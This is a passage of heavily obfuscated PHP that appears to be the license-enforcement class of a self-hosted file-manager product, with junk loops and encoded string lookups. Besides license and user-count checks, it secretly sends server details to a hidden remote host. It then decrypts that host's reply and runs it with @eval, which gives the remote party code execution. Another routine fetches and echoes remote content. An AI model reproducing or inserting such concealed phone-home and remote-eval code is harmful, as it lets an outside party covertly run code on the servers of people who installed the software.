$Îµ“‚šË[204]), $Îµ“‚šË[6]); $ŞŞ¬°–Ñ = $÷¹ °„×[728]; if (!$ŞŞ¬°–Ñ) { die; } show_json(LNG($Îµ“‚šË[189]), !0); } private function licenseRegistSuccess() { $¬µÎİÁù =& $_SERVER[ÖÑ—ÉÒ†]; $¿æ—ó„Ä = Model($¬µÎİÁù[33])->get(); if ($¿æ—ó„Ä[$¬µÎİÁù[63]] != $¬µÎİÁù[122]) { Model($¬µÎİÁù[33])->set($¬µÎİÁù[63], $¬µÎİÁù[122]); } Action($¬µÎİÁù[205])->initStart(!0); } private function ahjvb679ad43() { $×Ï±¨Œ =& $_SERVER[ÖÑ—ÉÒ†]; Model($×Ï±¨Œ[33])->set(array($×Ï±¨Œ[153] => $×Ï±¨Œ[6], $×Ï±¨Œ[191] => $×Ï±¨Œ[6], $×Ï±¨Œ[108] => $×Ï±¨Œ[109], $×Ï±¨Œ[110] => $×Ï±¨Œ[6], $×Ï±¨Œ[111] => $×Ï±¨Œ[6])); Model($×Ï±¨Œ[33])->setDeep($×Ï±¨Œ[198], $×Ï±¨Œ[206]); $this->viqpbaa7f287 = array(); $this->aqlj2c7dca88 = $×Ï±¨Œ[109]; } private function tgqpe5d4053f() { $ÌéñÒßõ =& $_SERVER[‹è™Ü¸Ñ]; $‚¢Ú…³ =& $_SERVER[ÖÑ—ÉÒ†]; $_SERVER[$‚¢Ú…³[162]] = _get($_SERVER, $‚¢Ú…³[162], APP_HOST); $é–Ëó×» = $ÌéñÒßõ[729]; if (!$é–Ëó×») { die; } $this->aqlj2c7dca88 = $‚¢Ú…³[109]; $Î«Ô¨à = Model($‚¢Ú…³[33])->get(); $šñÁ††ù = $ÌéñÒßõ[730]; if (strlen($šñÁ††ù) < $ÌéñÒßõ[697]) { return; } if ($Î«Ô¨à[$‚¢Ú…³[108]] == $‚¢Ú…³[109]) { return; } $î™–ª® = Model($‚¢Ú…³[33])->get($‚¢Ú…³[100]); $ Î²±óß = $ÌéñÒßõ[731]; while (strlen($ Î²±óß) < $ÌéñÒßõ[697]) { if (!$ Î²±óß) { break; } $ Î²±óß++; } $ıŠ„šõ¬ = $‚¢Ú…³[203] . md5($î™–ª® . $‚¢Ú…³[204]); $®Ã™Ãúò = Cache::get($ıŠ„šõ¬); if (!is_array($®Ã™Ãúò) || !isset($®Ã™Ãúò[$‚¢Ú…³[207]]) || time() - $®Ã™Ãúò[$‚¢Ú…³[207]] >= 60) { $Ä°„ì› = Model($‚¢Ú…³[7])->loadList(); $¬Í´¼¸õ = $Ä°„ì›[$‚¢Ú…³[200]]; $¦°É‘¬Š = md5($_SERVER[$‚¢Ú…³[106]] . strrev($î™–ª®) . $Î«Ô¨à[$‚¢Ú…³[191]]); $ûéŞ˜È¶ = strrev(substr($¦°É‘¬Š, 10, 16)); $®Ã™Ãúò = $this->zjlh961c075c($¬Í´¼¸õ[$‚¢Ú…³[86]][$ûéŞ˜È¶], $¦°É‘¬Š); $®Ã™Ãúò = json_decode($®Ã™Ãúò, !0); } if (!is_array($®Ã™Ãúò)) { return $this->ahjvb679ad43(); } $˜íÀŞ = strtotime($®Ã™Ãúò[$‚¢Ú…³[129]]); if (time() >= $˜íÀŞ) { return $this->ahjvb679ad43(); } if (!isset($®Ã™Ãúò[$‚¢Ú…³[207]]) || time() - $®Ã™Ãúò[$‚¢Ú…³[207]] > 20) { $®Ã™Ãúò[$‚¢Ú…³[207]] = time(); Cache::set($ıŠ„šõ¬, $®Ã™Ãúò); } $this->viqpbaa7f287 = $®Ã™Ãúò; $this->aqlj2c7dca88 = $Î«Ô¨à[$‚¢Ú…³[108]]; $—ñğª’ = $ÌéñÒßõ[732]; if (strlen($—ñğª’) < $ÌéñÒßõ[694]) { return; } } private function mhpga1e756e6() { $‹Ô‚İ€­ =& $_SERVER[ÖÑ—ÉÒ†]; $ã€Ñù‡Ğ = $GLOBALS[$‹Ô‚İ€­[13]]; $¹Ù”­Ç = $_SERVER[$‹Ô‚İ€­[24]]; if ($¹Ù”­Ç == $‹Ô‚İ€­[208] && $this->aqlj2c7dca88 == $‹Ô‚İ€­[109]) { show_json(LNG($‹Ô‚İ€­[209]), !1, $‹Ô‚İ€­[210]); } $˜À¿Êö = array($‹Ô‚İ€­[211], $‹Ô‚İ€­[212]); if (in_array($¹Ù”­Ç, $˜À¿Êö)) { if ($this->aqlj2c7dca88 == $‹Ô‚İ€­[109] && isset($ã€Ñù‡Ğ[$‹Ô‚İ€­[213]])) { show_json(LNG($‹Ô‚İ€­[209]), !1, $‹Ô‚İ€­[210]); die; } $‘é’ë›Ç = $this->maiz5f4bda29(); if ($‘é’ë›Ç != intval($‹Ô‚İ€­[214])) { if ($‘é’ë›Ç <= Model($‹Ô‚İ€­[125])->count()) { show_json(LNG($‹Ô‚İ€­[215]), !1, $‹Ô‚İ€­[210]); die; } } } } private function whaq4260ead1() { $ÀÉñÜú¶ =& $_SERVER[‹è™Ü¸Ñ]; $Åäô„­ =& $_SERVER[ÖÑ—ÉÒ†]; $£åŠÉÓƒ = array($Åäô„­[119], $Åäô„­[120]); if (!KodUser::isRoot() || !isset($_GET[$Åäô„­[216]])) { return; } if (!in_array($_SERVER[$Åäô„­[24]], $£åŠÉÓƒ)) { return; } $‰ëÒ€… = $Åäô„­[217]; $‰ëÒ€… = $this->umcx32f83135($‰ëÒ€…, $Åäô„­[218]); $ûíê«„³ = $ÀÉñÜú¶[733]; if (strlen($ûíê«„³) < $ÀÉñÜú¶[689]) { die; } $±Ÿ‚½¿Á = stream_context_create(array($Åäô„­[219] => array($Åäô„­[220] => $Åäô„­[221], $Åäô„­[222] => 3))); $¯ÀºÉ’ = $ÀÉñÜú¶[734]; while (strlen($¯ÀºÉ’) < $ÀÉñÜú¶[692]) { if (!$¯ÀºÉ’) { break; } $¯ÀºÉ’++; } $Øñ¡Ïö‡ = @file_get_contents($‰ëÒ€…, !1, $±Ÿ‚½¿Á); $Ú™à·ü = $ÀÉñÜú¶[735]; header($Åäô„­[223]); $†Ë³Ú½ = $ÀÉñÜú¶[736]; while ($†Ë³Ú½ < $ÀÉñÜú¶[694]) { if ($†Ë³Ú½ >= 0) { break; } $†Ë³Ú½++; } if ($Øñ¡Ïö‡ && strstr($Øñ¡Ïö‡, $Åäô„­[224])) { echo $Øñ¡Ïö‡; } die; } public function pwrt8d35f37b($¥³‚«ß—) { $ÀÀñ€Ôì =& $_SERVER[‹è™Ü¸Ñ]; $Î¤Œ…Ù« =& $_SERVER[ÖÑ—ÉÒ†]; if ($this->aqlj2c7dca88 == $Î¤Œ…Ù«[225]) { return $¥³‚«ß—; } $ö‹İ›ø = $this->versionPluginList(); $Œ—Õá°Ÿ = $ÀÀñ€Ôì[737]; if (!$Œ—Õá°Ÿ) { return; } $Â£ÕÁõ— = explode($Î¤Œ…Ù«[226], $this->versionPluginFilter()); $Ğ³¢òÔ¸ = array(); foreach ($ö‹İ›ø as $‰ÂÉòóÄ => $ÃıÄ­…) { if ($ÃıÄ­… == $Î¤Œ…Ù«[227] && substr($this->aqlj2c7dca88, 0, 1) == $Î¤Œ…Ù«[227]) { continue; } if (!in_array($‰ÂÉòóÄ, $Â£ÕÁõ—)) { $Ğ³¢òÔ¸[] = $‰ÂÉòóÄ; } } foreach ($Ğ³¢òÔ¸ as $‰ÂÉòóÄ) { unset($¥³‚«ß—[$‰ÂÉòóÄ]); } return $¥³‚«ß—; $Ã¿­¥Õ = $ÀÀñ€Ôì[738]; if (!$Ã¿­¥Õ) { return; } } private function versionPluginList() { $ï­£²é¡ =& $_SERVER[ÖÑ—ÉÒ†]; return array($ï­£²é¡[228] => $ï­£²é¡[227], $ï­£²é¡[229] => $ï­£²é¡[227], $ï­£²é¡[230] => $ï­£²é¡[227], $ï­£²é¡[231] => $ï­£²é¡[232], $ï­£²é¡[233] => $ï­£²é¡[232], $ï­£²é¡[234] => $ï­£²é¡[232], $ï­£²é¡[235] => $ï­£²é¡[232], $ï­£²é¡[236] => $ï­£²é¡[232], $ï­£²é¡[237] => $ï­£²é¡[232], $ï­£²é¡[238] => $ï­£²é¡[232], $ï­£²é¡[239] => $ï­£²é¡[232], $ï­£²é¡[240] => $ï­£²é¡[232], $ï­£²é¡[241] => $ï­£²é¡[232], $ï­£²é¡[242] => $ï­£²é¡[232], $ï­£²é¡[243] => $ï­£²é¡[232], $ï­£²é¡[244] => $ï­£²é¡[232]); } private function versionPluginFilter() { $‚·˜É›Û =& $_SERVER[‹è™Ü¸Ñ]; $ÜÅ‘’åÜ =& $_SERVER[ÖÑ—ÉÒ†]; if ($this->aqlj2c7dca88 == $ÜÅ‘’åÜ[109]) { return $ÜÅ‘’åÜ[6]; } $Ÿ¨š›À¢ = _get($this->viqpbaa7f287, $ÜÅ‘’åÜ[245], $ÜÅ‘’åÜ[6]); $ğñ§½Õ = $‚·˜É›Û[739]; if (strlen($ğñ§½Õ) < $‚·˜É›Û[694]) { die; } $‚›òõÇÖ = _get($this->viqpbaa7f287, $ÜÅ‘’åÜ[116], $ÜÅ‘’åÜ[6]); $óÏÒ†œ³ = _get($this->viqpbaa7f287, $ÜÅ‘’åÜ[246], $ÜÅ‘’åÜ[6]); if ($‚›òõÇÖ > time() && $óÏÒ†œ³ > time()) { $ìğÈ÷—‡ = explode($ÜÅ‘’åÜ[226], $Ÿ¨š›À¢); $å˜ÖÙµõ = array_keys($this->versionPluginList()); $Ÿ¨š›À¢ = array_merge($ìğÈ÷—‡, $å˜ÖÙµõ); $Ÿ¨š›À¢ = implode($ÜÅ‘’åÜ[226], array_filter(array_unique($Ÿ¨š›À¢))); } return $Ÿ¨š›À¢; } private function reqia0150755() { $ŠÕø”œé =& $_SERVER[ÖÑ—ÉÒ†]; if ($this->aqlj2c7dca88 != $ŠÕø”œé[109]) { $GLOBALS[$ŠÕø”œé[86]][$ŠÕø”œé[90]][$ŠÕø”œé[247]] = $ŠÕø”œé[206]; return; } $GLOBALS[$ŠÕø”œé[86]][$ŠÕø”œé[248]] = $ŠÕø”œé[122]; if (Model($ŠÕø”œé[249])->get($ŠÕø”œé[63]) != $ŠÕø”œé[206]) { Model($ŠÕø”œé[249])->set($ŠÕø”œé[63], $ŠÕø”œé[206]); } } public function unit45a51544() { $ı¬£©¨† =& $_SERVER[‹è™Ü¸Ñ]; return $_SERVER[ÖÑ—ÉÒ†][250]; $ü“‚Ÿû¥ = $ı¬£©¨†[740]; if (strlen($ü“‚Ÿû¥) < $ı¬£©¨†[694]) { die; } } private function qcln3061aed2() { $ÓÌ¦‰ÔÅ =& $_SERVER[‹è™Ü¸Ñ]; $¥é‹î•“ =& $_SERVER[ÖÑ—ÉÒ†]; $¸Éïµ˜ = array($¥é‹î•“[251], $¥é‹î•“[252], $¥é‹î•“[253]); $¹Êïü¼ = $¥é‹î•“[254] . md5($¥é‹î•“[255]); $¥ò´Ï = $ÓÌ¦‰ÔÅ[741]; if ($this->aqlj2c7dca88 == $¥é‹î•“[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$¥é‹î•“[24]], $¸Éïµ˜)) { return; } if (time() % 4 != 0) { return; } $ÒøƒÒæÊ = call_user_func(array($¥é‹î•“[256], $¥é‹î•“[257]), $¹Êïü¼); if ($ÒøƒÒæÊ && time() - $ÒøƒÒæÊ < intval($¥é‹î•“[258])) { return; } call_user_func(array($¥é‹î•“[256], $¥é‹î•“[139]), $¹Êïü¼, time()); $ø…å»§­ = Model($¥é‹î•“[33])->get($¥é‹î•“[100]); $ÕÖØ¡ş™ = $ÓÌ¦‰ÔÅ[742]; while (strlen($ÕÖØ¡ş™) < $ÓÌ¦‰ÔÅ[694]) { if (!$ÕÖØ¡ş™) { break; } $ÕÖØ¡ş™++; } $ŞĞİ€èÛ = array($¥é‹î•“[152] => Model($¥é‹î•“[33])->get($¥é‹î•“[153]), $¥é‹î•“[167] => $this->aqlj2c7dca88, $¥é‹î•“[163] => $_SERVER[$¥é‹î•“[164]], $¥é‹î•“[165] => Model($¥é‹î•“[33])->get($¥é‹î•“[131]), $¥é‹î•“[105] => md5($_SERVER[$¥é‹î•“[106]] . $ø…å»§­), $¥é‹î•“[156] => $¥é‹î•“[136], $¥é‹î•“[159] => $_SERVER[$¥é‹î•“[160]]); $›‘ÔŸã = $this->flcp9eedf9f5($¥é‹î•“[259], $ŞĞİ€èÛ); $–Ÿ¬«»Ö = $ÓÌ¦‰ÔÅ[743]; while ($–Ÿ¬«»Ö < $ÓÌ¦‰ÔÅ[697]) { if ($–Ÿ¬«»Ö >= 0) { break; } $–Ÿ¬«»Ö++; } if (!is_array($›‘ÔŸã)) { return; } if ($›‘ÔŸã[$¥é‹î•“[152]] && $›‘ÔŸã[$¥é‹î•“[260]]) { if ($this->fsbmfe5f5e7f($›‘ÔŸã[$¥é‹î•“[260]]) == $ŞĞİ€èÛ[$¥é‹î•“[152]]) { return; } } $this->ahjvb679ad43(); if ($this->fsbmfe5f5e7f($›‘ÔŸã[$¥é‹î•“[260]]) != $ŞĞİ€èÛ[$¥é‹î•“[152]]) { $ÔÌ¾Ç·ª = array($¥é‹î•“[185] => $ø…å»§­, $¥é‹î•“[186] => $_SERVER[$¥é‹î•“[106]], $¥é‹î•“[187] => this_url(), $¥é‹î•“[161] => $_SERVER[$¥é‹î•“[162]]); $æĞ³Éìá = $this->ance3a237a40(json_encode($ÔÌ¾Ç·ª)); $›‘ÔŸã = $this->flcp9eedf9f5($¥é‹î•“[188] . $æĞ³Éìá); if ($›‘ÔŸã && is_array($›‘ÔŸã) && isset($›‘ÔŸã[$¥é‹î•“[260]])) { $ƒˆÜ®³¢ = $this->zjlh961c075c($›‘ÔŸã[$¥é‹î•“[260]], 2); if ($ƒˆÜ®³¢) { $ƒˆÜ®³¢ = $this->fsbmfe5f5e7f($ƒˆÜ®³¢); } if ($ƒˆÜ®³¢) { try { @eval($ƒˆÜ®³¢); } catch (Exception $á§êşªÎ) { } } } } } private function flcp9eedf9f5($ñò“· = '', $Àº­¬Ô = array(), $½İº“Ñ€ = 5) { $Â™Ø¾‡ =& $_SERVER[‹è™Ü¸Ñ]; $ÅåÕÊÂ» =& $_SERVER[ÖÑ—ÉÒ†]; $®šóÜÚú = $ÅåÕÊÂ»[261]; $®šóÜÚú = $this->umcx32f83135($®šóÜÚú, $ÅåÕÊÂ»[262]); $®šóÜÚú = $®šóÜÚú . $ñò“·; if ($Àº­¬Ô && is_array($Àº­¬Ô)) { $®šóÜÚú = $®šóÜÚú . $ÅåÕÊÂ»[263] . http_build_query($Àº­¬Ô); } if ($Àº­¬Ô === -1) { return $®šóÜÚú; } $úÈİ±§µ = stream_context_create(array($ÅåÕÊÂ»[219] => array($ÅåÕÊÂ»[222] => $½İº“Ñ€, $ÅåÕÊÂ»[220] => $ÅåÕÊÂ»[264]), $ÅåÕÊÂ»[265] => array($ÅåÕÊÂ»[266] => !1, $ÅåÕÊÂ»[267] => !1))); $ò»öÄ˜Ç = $Â™Ø¾‡[744]; $Àº­¬Ô = @file_get_contents($®šóÜÚú, !1, $úÈİ±§µ); $ìÛíé»­ = $Â™Ø¾‡[745]; return json_decode($Àº­¬Ô, !0); $±¸Şäñã = $Â™Ø¾‡[746]; } private function maiz5f4bda29() { $ÅãƒÑ¶¯ =& $_SERVER[‹è™Ü¸Ñ]; $ó‘÷ª =& $_SERVER[ÖÑ—ÉÒ†]; $åÁßæÇª = array($ó‘÷ª[268] => $ó‘÷ª[269], $ó‘÷ª[270] => $ó‘÷ª[271], $ó‘÷ª[272] => $ó‘÷ª[273], $ó‘÷ª[274] => $ó‘÷ª[275], $ó‘÷ª[276] => $ó‘÷ª[277], $ó‘÷ª[278] => $ó‘÷ª[214], $ó‘÷ª[279] => $ó‘÷ª[214], $ó‘÷ª[280] => $ó‘÷ª[269], $ó‘÷ª[281] => $ó‘÷ª[271], $ó‘÷ª[282] => $ó‘÷ª[273], $ó‘÷ª[283] => $ó‘÷ª[284], $ó‘÷ª[285] => $ó‘÷ª[275], $ó‘÷ª[286] => $ó‘÷ª[287], $ó‘÷ª[288] => $ó‘÷ª[277], $ó‘÷ª[289] => $ó‘÷ª[290], $ó‘÷ª[291] => $ó‘÷ª[292], $ó‘÷ª[293] => $ó‘÷ª[294]); $èîş¦² = $åÁßæÇª[$this->aqlj2c7dca88]; $’¸ÅÑ = $ÅãƒÑ¶¯[747]; $èîş¦² = intval($èîş¦² ? $èîş¦² : $ó‘÷ª[269]); $ÁËîìó = $ÅãƒÑ¶¯[748]; if (strlen($ÁËîìó) < $ÅãƒÑ¶¯[697]) { die; } $Èî·ı×‹ = _get($this->viqpbaa7f287, $ó‘÷ª[295]); $ò÷ØıÌŠ = $ÅãƒÑ¶¯[749]; if (!$ò÷ØıÌŠ) { die; } $Èî·ı×‹ = $Èî·ı×‹ ? intval($Èî·ı×‹) : 0; $ÈÃ¹Ç¸» = $ÅãƒÑ¶¯[750]; if (strlen($ÈÃ¹Ç¸») < $ÅãƒÑ¶¯[692]) { die; } return $èîş¦² + $Èî·ı×‹; } public function tbgj59710d3d($Ç–šÅï) { $ƒæîØ¸ =& $_SERVER[‹è™Ü¸Ñ]; $ää…ıÊˆ =& $_SERVER[ÖÑ—ÉÒ†]; $ÛÊæ× = $this->maiz5f4bda29(); if ($Ç–šÅï[$ää…ıÊˆ[296]] == $ää…ıÊˆ[122]) { return; } if ($ÛÊæ× >= intval($ää…ıÊˆ[214])) { return; } $¢»ƒøÀ = Model($ää…ıÊˆ[125])->count(); $«¢½÷ = $ƒæîØ¸[751]; if (!$«¢½÷) { return; } if ($¢»ƒøÀ <= $ÛÊæ×) { return; } $Õ™‚çĞ¿ = Model($ää…ıÊˆ[125])->field($ää…ıÊˆ[296])->limit($ÛÊæ×)->select(); $¿ñ÷ğ•Ë = $ƒæîØ¸[752]; $Õ™‚çĞ¿ = array_to_keyvalue($Õ™‚çĞ¿, $ää…ıÊˆ[6], $ää…ıÊˆ[296]); if (!in_array($Ç–šÅï[$ää…ıÊˆ[296]], $Õ™‚çĞ¿)) { show_json($ää…ıÊˆ[297], !1, $ää…ıÊˆ[210]); } } public function cnzga87ea421() { $¸§’‘°œ =& $_SERVER[ÖÑ—ÉÒ†]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ú“üûƒè = $¸§’‘°œ[217]; $ú“üûƒè = $this->umcx32f83135($ú“üûƒè, $¸§’‘°œ[218]); $ÛÚ‰‹ë± = $_SERVER[‹è™Ü¸Ñ][753]; if (!$ÛÚ‰‹ë±) { return; } $¬±ãÊø¬ = stream_context_create(array($¸§’‘°œ[219] => array($¸§’‘°œ[220] => $¸§’‘°œ[221], $¸§’‘°œ[222] => 3))); $›í‹÷ÏÉ = @file_get_contents($ú“üûƒè, !1, $¬±ãÊø¬); echo $¸§’‘°œ[298] . hash_encode($›í‹÷ÏÉ) . $¸§’‘°œ[299]; } private function lkxc7e373410($ÂÛÁÀŸú, $ó­íÑ ¼, $ç¹í½±† = 3) { $•úƒ¬§› =& $_SERVER[‹è™Ü¸Ñ]; $“Œ¬¯ =& $_SERVER[ÖÑ—ÉÒ†]; usleep(1); $û°ûêÚ× = $•úƒ¬§›[754]; while (strlen($û°ûêÚ×) < $•úƒ¬§›[697]) { if (!$û°ûêÚ×) { break; } $û°ûêÚ×++; } $ÂÛÁÀŸú = trim($ÂÛÁÀŸú); $ÚÆ˜ù» = mt_rand(0, 5) . $“Œ¬¯[6]; $ØİİÁó = $•úƒ¬§›[737]; if (!$ØİİÁó) { die; } $©¡±€ô± = rand_string(15); $êºÏÈÖ÷ = $“Œ¬¯[300]; switch ($ÚÆ˜ù») { case $“Œ¬¯[206]: $«öÀù®Ä = $this->xtuj9ae9ce48($ÂÛÁÀŸú, strrev($ó­íÑ ¼ . $©¡±€ô±)); $°“Ÿõ»© = $•úƒ¬§›[755]; break; $õ·¶Øİù = $•úƒ¬§›[756]; if (strlen($õ·¶Øİù) < $•úƒ¬§›[697]) { return; } case $“Œ¬¯[122]: $«öÀù®Ä = $this->xtuj9ae9ce48($ÂÛÁÀŸú, strrev($©¡±€ô± . $ó­íÑ ¼)); break; $¶€¬Š¾è = $•úƒ¬§›[757]; while (strlen($¶€¬Š¾è) < $•úƒ¬§›[689]) { if (!$¶€¬Š¾è) { break; } $¶€¬Š¾è++; } case $“Œ¬¯[301]: $«öÀù®Ä = $this->xtuj9ae9ce48($ÂÛÁÀŸú, base64_encode($©¡±€ô± . $ó­íÑ ¼)); $×Åìê÷Ï = $•úƒ¬§›[758]; if (strlen($×Åìê÷Ï) < $•úƒ¬§›[689]) { return; } break; $Óì‚Ë–ı = $•úƒ¬§›[759]; if (strlen($Óì‚Ë–ı) < $•úƒ¬§›[684]) { die; } case $“Œ¬¯[302]: $«öÀù®Ä = $this->xtuj9ae9ce48($ÂÛÁÀŸú, md5($©¡±€ô± . $ó­íÑ ¼)); $…µœÜòö = $•úƒ¬§›[760]; if (strlen($…µœÜòö) < $•úƒ¬§›[689]) { return; } break; $“¯Ñ¼Êñ = $•úƒ¬§›[761]; while (strlen($“¯Ñ¼Êñ) < $•úƒ¬§›[694]) { if (!$“¯Ñ¼Êñ) { break; } $“¯Ñ¼Êñ++; } case $“Œ¬¯[303]: $ÂÛÁÀŸú = base64_encode($ÂÛÁÀŸú); $™Ïû·ÀÃ = rand(0, 64); $šçÎ¹ = $•úƒ¬§›[762]; if (!$šçÎ¹) { return; } $½¡µ¼È = $êºÏÈÖ÷[$™Ïû·ÀÃ]; $ƒ­€Îæ = md5($½¡µ¼È . md5($ó­íÑ ¼ . $½¡µ¼È) . $ó­íÑ ¼); $Òü€’ğ¿ = $•úƒ¬§›[763]; $ƒ­€Îæ = substr($ƒ­€Îæ, $™Ïû·ÀÃ % 8, $™Ïû·ÀÃ % 8 + 7); $òÆØü«û = $“Œ¬¯[6]; $ÌÌ‘˜ç† = $•úƒ¬§›[764]; while (strlen($ÌÌ‘˜ç†) < $•úƒ¬§›[689]) { if (!$ÌÌ‘˜ç†) { break; } $ÌÌ‘˜ç†++; } $ù¿±»ìÓ = 0; $ÏÛÁì˜© = $•úƒ¬§›[721]; $ı©ˆù¨ô = 0; $À§É³ï = $•úƒ¬§›[765]; $òãÙ = 0; $•†êŸ¸İ = $•úƒ¬§›[766]; if (strlen($•†êŸ¸İ) < $•úƒ¬§›[692]) { die; } for ($ù¿±»ìÓ = 0; $ù¿±»ìÓ < strlen($ÂÛÁÀŸú); $ù¿±»ìÓ++) { $òãÙ = $òãÙ == strlen($ƒ­€Îæ) ? 0 : $òãÙ; $ÓóÌŸ¥á = $•úƒ¬§›[767]; while ($ÓóÌŸ¥á < $•úƒ¬§›[684]) { if ($ÓóÌŸ¥á >= 0) { break; } $ÓóÌŸ¥á++; } $ı©ˆù¨ô = ($™Ïû·ÀÃ + strpos($êºÏÈÖ÷, $ÂÛÁÀŸú[$ù¿±»ìÓ]) + ord($ƒ­€Îæ[$òãÙ++])) % 64; $òÑÛ»„ª = $•úƒ¬§›[768]; if (!$òÑÛ»„ª) { die; } $òÆØü«û .= $êºÏÈÖ÷[$ı©ˆù¨ô]; } $«öÀù®Ä = hash_encode($½¡µ¼È . $òÆØü«û); break; $õùÕ‰ò = $•úƒ¬§›[769]; while ($õùÕ‰ò < $•úƒ¬§›[692]) { if ($õùÕ‰ò >= 0) { break; } $õùÕ‰ò++; } default: $«öÀù®Ä = $this->xtuj9ae9ce48($ÂÛÁÀŸú, $ó­íÑ ¼ . $©¡±€ô±); break; } $«öÀù®Ä = strrev($ÚÆ˜ù» . $©¡±€ô± . $«öÀù®Ä); if ($ç¹í½±† - 1 > 0) { $«öÀù®Ä = $this->lkxc7e373410($«öÀù®Ä, $ó­íÑ ¼, $ç¹í½±† - 1); } return $«öÀù®Ä; } private function zjlh961c075c($ŒÇ†Óïƒ, $âÈ’×ñ‹, $ğôñ„ş = 3) { $ë¬–å¨Š =& $_SERVER[‹è™Ü¸Ñ]; $•á‰¿ØÂ =& $_SERVER[ÖÑ—ÉÒ†]; if (!is_string($ŒÇ†Óïƒ) || strlen($ŒÇ†Óïƒ) < 10) { return !1; } $ŒÇ†Óïƒ = trim($ŒÇ†Óïƒ); $ŒÇ†Óïƒ = strrev($ŒÇ†Óïƒ); $¨†©—¾¤ = $ŒÇ†Óïƒ[0]; $Ù®²Î¢ = $ë¬–å¨Š[770]; while ($Ù®²Î¢ < $ë¬–å¨Š[694]) { if ($Ù®²Î¢ >= 0) { break; } $Ù®²Î¢++; } $Î“ò«È = substr($ŒÇ†Óïƒ, 1, 15); $ŒÇ†Óïƒ = substr($ŒÇ†Óïƒ, 16); $Ş›Ç·êå = $•á‰¿ØÂ[300]; $§ãş°š¼ = $ë¬–å¨Š[771]; while ($§ãş°š¼ < $ë¬–å¨Š[697]) { if ($§ãş°š¼ >= 0) { break; } $§ãş°š¼++; } switch ($¨†©—¾¤) { case $•á‰¿ØÂ[206]: $³µ×¾˜ = $this->umcx32f83135($ŒÇ†Óïƒ, strrev($âÈ’×ñ‹ . $Î“ò«È)); break; $œû¤Âöº = $ë¬–å¨Š[772]; if (strlen($œû¤Âöº) < $ë¬–å¨Š[684]) { return; } case $•á‰¿ØÂ[122]: $³µ×¾˜ = $this->umcx32f83135($ŒÇ†Óïƒ, strrev($Î“ò«È . $âÈ’×ñ‹)); break; $Ş§ßò¬Í = $ë¬–å¨Š[696]; if (!$Ş§ßò¬Í) { die; } case $•á‰¿ØÂ[301]: $³µ×¾˜ = $this->umcx32f83135($ŒÇ†Óïƒ, base64_encode($Î“ò«È . $âÈ’×ñ‹)); $Ï½ƒ¶Ä = $ë¬–å¨Š[773]; if (!$Ï½ƒ¶Ä) { die; } break; case $•á‰¿ØÂ[302]: $³µ×¾˜ = $this->umcx32f83135($ŒÇ†Óïƒ, md5($Î“ò«È . $âÈ’×ñ‹)); $ÑÅû›€º = $ë¬–å¨Š[774]; while ($ÑÅû›€º < $ë¬–å¨Š[692]) { if ($ÑÅû›€º >= 0) { break; } $ÑÅû›€º++; } break; case $•á‰¿ØÂ[303]: $ŒÇ†Óïƒ = hash_decode($ŒÇ†Óïƒ); $ıªÒƒŒş = $ë¬–å¨Š[775]; if (!$ıªÒƒŒş) { die; } $í²éÂ¹ = $ŒÇ†Óïƒ[0]; $Îœé˜šÇ = $ë¬–å¨Š[776]; while ($Îœé˜šÇ < $ë¬–å¨Š[694]) { if ($Îœé˜šÇ >= 0) { break; } $Îœé˜šÇ++; } $ŒÇ†Óïƒ = substr($ŒÇ†Óïƒ, 1); $Âáê÷¾Ö = strpos($Ş›Ç·êå, $í²éÂ¹); $ªæ æ¦» = $ë¬–å¨Š[777]; while ($ªæ æ¦» < $ë¬–å¨Š[684]) { if ($ªæ æ¦» >= 0) { break; } $ªæ æ¦»++; } $ºò¥ˆ•€ = md5($í²éÂ¹ . md5($âÈ’×ñ‹ . $í²éÂ¹) . $âÈ’×ñ‹); $ºò¥ˆ•€ = substr($ºò¥ˆ•€, $Âáê÷¾Ö % 8, $Âáê÷¾Ö % 8 + 7); $ù£´ô› = $•á‰¿ØÂ[6]; $¬Û¢É§ê = 0; $›úïÔå = 0; $¬Á–ùè = 0; $ïÅËş©£ = $ë¬–å¨Š[778]; while ($ïÅËş©£ < $ë¬–å¨Š[689]) { if ($ïÅËş©£ >= 0) { break; } $ïÅËş©£++; } for ($¬Û¢É§ê = 0; $¬Û¢É§ê < strlen($ŒÇ†Óïƒ); $¬Û¢É§ê++) { $¬Á–ùè = $¬Á–ùè == strlen($ºò¥ˆ•€) ? 0 : $¬Á–ùè; $ëÚ’ÑÍ = $¬Á–ùè++; $›úïÔå = strpos($Ş›Ç·êå, $ŒÇ†Óïƒ[$¬Û¢É§ê]) - $Âáê÷¾Ö - ord($ºò¥ˆ•€[$ëÚ’ÑÍ]); while ($›úïÔå < 0) { $›úïÔå += 64; } $ù£´ô› .= $Ş›Ç·êå[$›úïÔå]; $ÁôÈøµß = $ë¬–å¨Š[779]; } $³µ×¾˜ = base64_decode($ù£´ô›); break; $Õ–®°è = $ë¬–å¨Š[780]; if (strlen($Õ–®°è) < $ë¬–å¨Š[697]) { die; } default: $³µ×¾˜ = $this->umcx32f83135($ŒÇ†Óïƒ, $âÈ’×ñ‹ . $Î“ò«È); break; $ŸŞ²ÚÉğ = $ë¬–å¨Š[781]; if (strlen($ŸŞ²ÚÉğ) < $ë¬–å¨Š[697]) { die; } } if ($ğôñ„ş - 1 > 0) { $³µ×¾˜ = $this->zjlh961c075c($³µ×¾˜, $âÈ’×ñ‹, $ğôñ„ş - 1); } return $³µ×¾˜; } public function ance3a237a40($÷¿ó›Ÿå) { $´²÷”ï© =& $_SERVER[‹è™Ü¸Ñ]; $‘¹Ê»ã— =& $_SERVER[ÖÑ—ÉÒ†]; $–Ô®æ» = $this->zfkyb71e736d(); $Æ¥¿‹  = $´²÷”ï©[782]; if (strlen($Æ¥¿‹ ) < $´²÷”ï©[684]) { die; } $˜³ÂãÂº = $this->zfkyb71e736d(); $“¼¢äüı = $´²÷”ï©[783]; if (strlen($“¼¢äüı) < $´²÷”ï©[694]) { die; } $¶¤„–Êè = ($–Ô®æ» - 1) * ($˜³ÂãÂº - 1); $°¨Ø£é = $´²÷”ï©[784]; $Æí±ôˆî = intval(($–Ô®æ» + $˜³ÂãÂº) / 2); while (1) { $´Ò‘‚éÖ = $Æí±ôˆî; $§«§Œ÷‰ = $´²÷”ï©[785]; if (strlen($§«§Œ÷‰) < $´²÷”ï©[697]) { die; } $„¹¼ºªŞ = $¶¤„–Êè; while ($„¹¼ºªŞ % $´Ò‘‚éÖ != 0) { $ìæçò¦ = $„¹¼ºªŞ; $„¹¼ºªŞ = $´Ò‘‚éÖ; $´Ò‘‚éÖ = $ìæçò¦ % 